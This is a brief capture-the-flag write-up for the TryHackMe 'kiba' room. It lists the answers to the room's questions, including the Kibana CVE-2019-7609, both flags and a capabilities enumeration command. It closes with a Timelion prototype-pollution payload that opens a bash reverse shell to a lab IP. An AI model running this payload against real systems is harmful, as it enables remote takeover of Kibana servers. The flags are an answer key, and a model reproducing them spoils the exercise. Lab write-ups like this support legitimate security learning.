# TryHackMe kiba

# Saikat Karmakar | Started Dec 28:2020

# Task 1 
1. What is the vulnerability that is specific to programming languages with 			prototype-based inheritance?
```
prototype pollution
```
2. What is the version of visualization dashboard installed in the server?
```
6.5.4
```
3. What is the CVE number for this vulnerability? This will be in the format: 			CVE-0000-0000
```
CVE-2019-7609
```
4. Compromise the machine and locate user.txt
```
THM{1s_easy_pwn3d_k1bana_w1th_rce}
```
5. How would you recursively list all of these capabilities?
```
getcap -r /
```
6. Escalate privileges and obtain root.txt
```
THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
```




```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.4.23.120/9999 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```